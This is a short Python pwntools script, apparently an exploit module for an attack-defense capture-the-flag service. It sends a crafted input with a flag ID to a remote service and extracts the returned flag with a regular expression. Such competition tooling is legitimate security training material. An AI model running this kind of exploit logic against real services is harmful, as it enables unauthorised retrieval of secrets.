#########################
## Connor Nelson, 2017 ##
#########################

import re

from pwn import *

FLAG = r'FLG.{13}'
TIMEOUT = 5.0

def exploit_info():
    info = {}
    info['exploit_function'] = exploit
    info['service_id'] = 10001
    return info

def exploit(remote, flag_id):
    remote.send("X\n%s\n" % (flag_id,))
    response = remote.recvregex(FLAG, timeout=TIMEOUT)
    match = re.search(FLAG, response)
    if match:
        return match.group(0)
